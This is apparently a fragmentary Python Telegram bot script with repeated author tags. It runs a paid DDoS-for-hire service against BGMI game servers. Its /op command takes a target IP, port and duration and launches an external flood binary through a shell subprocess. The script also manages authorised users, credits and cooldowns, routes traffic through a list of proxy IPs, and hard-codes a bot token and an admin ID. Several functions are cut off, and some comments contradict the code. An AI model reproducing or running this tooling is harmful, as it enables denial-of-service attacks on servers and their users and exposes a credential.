...
# @Anupeiejfj GRP#bgmiddoserpython
...
# @Anupeiejfj GRPTg #from keep_alive import keep_alive
# @Anupeiejfj GRP #keep_alive()
# @Anupeiejfj GRP# insert your Telegram bot token here

    
bot = telebot.TeleBot('8077158177:AAGQtwcsB_REtCCbffTiAbYiDGidMmR_QKM')

# @Anupeiejfj GRP # Admin user IDs
admin_id = ["5004674194"]

# @Anupeiejfj GRP # File to store allowed user IDs
USER_FILE = "users.txt"

# @Anupeiejfj GRP # File to store command logs
LOG_FILE = "log.txt"


# @Anupeiejfj GRP # List of proxy addresses
PROXIES = [
...
"https://162.223.94.164:80",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://50.168.163.182:80",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://3.12.144.146:3128",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://50.174.7.157:80",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://12.186.205.122:80",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://50.239.72.18:80",#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
"https://134.73.65.97:6649"
    # @Anupeiejfj GRP # Add more proxy addresses as needed
]
...
# @Anupeiejfj GRP# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # @Anupeiejfj GRP # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
# @Anupeiejfj GRP # Function to log command to the file
def log_command(user_id, target, port, time):
    ...
    with open(LOG_FILE, "a") as file:  # @Anupeiejfj GRP # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\n\n")


# @Anupeiejfj GRP # Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = ". No data found ."#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
# @Anupeiejfj GRP # Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, time=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
def add_user(message):
    ...
    if user_id in admin_id:
        command = message.text.split()#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
#script by @Anupeiejfj 🚩
...
# @Anupeiejfj GRP # Function to handle the reply when free users run the /bgmi command
...
# @Anupeiejfj GRP # Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}
...
# @Anupeiejfj GRP # Handler for /bgmi command
@bot.message_handler(commands=['op'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # @Anupeiejfj GRP # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # @Anupeiejfj GRP # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 10:
                response = "🦋⁂༄𝙲𝙤𝙤𝕝𝒅𝒐ฬ𝒏༄⁂🦋"
                bot.reply_to(message, response)
                return
            # @Anupeiejfj GRP # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        if len(command) == 4:  # @Anupeiejfj GRP # Updated to accept target, time, and port
            target = command[1]
            port = int(command[2])  # @Anupeiejfj GRP # Convert time to integer
            time = int(command[3])  # @Anupeiejfj GRP # Convert port to integer
            if time > 180:
                response = "𝗠𝗮𝗸𝗲 𝘀𝘂𝗿𝗲 𝘆𝗼𝘂 𝗮𝗿𝗲 𝗲𝗻𝘁𝗲𝗿𝗲𝗱 18𝟬 𝘀𝗲𝗰"
            else:
                record_command_logs(user_id, '/op', target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)  # @Anupeiejfj GRP # Call start_attack_reply function
                full_command = f"./Rahul {target} {port} {time} 900"
                subprocess.run(full_command, shell=True)
                response = f"🏆𝐀🅣𝐓𝐀𝐂𝐊 𝐅𝐈𝐍ｴ𝐒𝐇🏆\n🅣𝑨𝑹𝑮𝑬𝑻 :- {target}\nƤ☢rtส :- {port}\nTime▪out :- {time} \nƓคмε‿✶ 𝘽𝔾𝗠ｴ\n\n═══VIP_ViP═══"
        else:
            response = "𝙀𝙉𝙏𝙀𝙍 𝙏𝙃𝙀 𝘼𝙏𝙏𝘼𝘾𝙆\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝟮.𝟯𝟰.𝟱𝟲.𝟱𝟲 𝟮𝟯𝟰𝟱𝟲 18𝟬\n𝗟𝗜𝗞𝗘 :- /𝗼𝗽 𝘁𝗮𝗿𝗴𝗲𝘁 𝗽𝗼𝗿𝘁 𝘁𝗶𝗺𝗲\n\n═══VIP_ViP═══"  # @Anupeiejfj GRP # Updated command syntax
    else:
...
# @Anupeiejfj GRP # Add /mylogs command to display logs recorded for bgmi and website commands
